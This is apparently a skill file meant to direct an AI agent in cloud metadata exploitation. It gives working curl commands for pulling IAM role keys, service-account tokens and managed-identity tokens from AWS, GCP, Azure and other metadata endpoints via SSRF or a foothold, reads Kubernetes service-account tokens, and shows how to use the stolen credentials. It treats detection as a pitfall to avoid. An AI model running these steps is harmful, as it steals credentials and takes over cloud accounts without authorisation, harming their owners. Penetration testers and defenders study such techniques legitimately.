---
name: cloud-metadata
description: "Cloud metadata service exploitation: SSRF to IMDS, credential retrieval, and identity abuse across AWS, GCP, and Azure. Use this skill when a workload or SSRF can reach the metadata endpoint."
---

# Cloud Metadata

## Overview

Every cloud VM exposes an internal metadata service with credentials. Reachable via SSRF, a compromised pod, or a foothold on the instance.

## AWS — IMDSv1

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
```

Returns `AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration`.

## AWS — IMDSv2

Requires a token:

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

SSRF bypass: if the sink allows a PUT with a header, IMDSv2 is reachable; otherwise redirect-based bypasses are limited.

## GCP

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Also: `/project/project-id`, `/instance/attributes/` (startup scripts often contain secrets).

## Azure

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Alibaba / Tencent / DigitalOcean

```bash
http://100.100.100.200/latest/meta-data/          # Alibaba
http://metadata.tencentyun.com/latest/meta-data/  # Tencent
http://169.254.169.254/metadata/v1/               # DigitalOcean
```

## Using the credentials

```bash
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name <role>
```

```bash
gcloud auth activate-service-account --key-file=sa.json
az login --identity
```

## Kubernetes

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k -H "Authorization: Bearer $(cat ...)" https://kubernetes.default.svc/api
```

## Pitfalls

- IMDSv2 blocks most SSRF; check whether the sink supports custom headers or PUT.
- Credentials expire (usually 6–12 hours); use them promptly.
- GuardDuty alerts on metadata access from unusual sources.

## Verification

The credentials must authorize a real API call (e.g., `sts get-caller-identity` returns an ARN).
